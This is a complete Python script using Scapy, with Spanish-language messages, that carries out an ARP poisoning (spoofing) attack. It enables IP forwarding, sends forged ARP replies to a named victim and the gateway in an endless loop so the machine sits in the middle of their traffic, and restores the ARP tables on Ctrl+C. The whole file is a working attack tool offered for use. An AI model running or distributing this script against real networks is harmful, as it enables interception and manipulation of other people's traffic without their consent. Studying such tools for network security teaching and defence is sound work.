from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os

def _enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read().strip() == "1":
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def enable_ip_route(verbose=True):
    if verbose:
        print("[!] Activando el enrutamiento IP...")
    if "nt" in os.name:
        print("[!] Advertencia: soporte para Windows no implementado.")
    else:
        _enable_linux_iproute()
    if verbose:
        print("[✓] Enrutamiento IP activado.")

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Enviado a {} : {} se hace pasar por {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Restaurando {} : {} se asocia a {}".format(target_ip, host_ip, host_mac))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script de envenenamiento ARP (spoofing)")
    parser.add_argument("target", help="Dirección IP de la víctima a envenenar")
    parser.add_argument("host", help="Dirección IP del host (generalmente el router)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Mostrar detalles durante la ejecución")
    args = parser.parse_args()

    target, host, verbose = args.target, args.host, args.verbose

    enable_ip_route(verbose)

    try:
        while True:
            spoof(target, host, verbose)
            spoof(host, target, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] ¡Se detectó CTRL+C! Restaurando la red, por favor espera...")
        restore(target, host, verbose)
        restore(host, target, verbose)
        print("[✓] Red restaurada correctamente.")
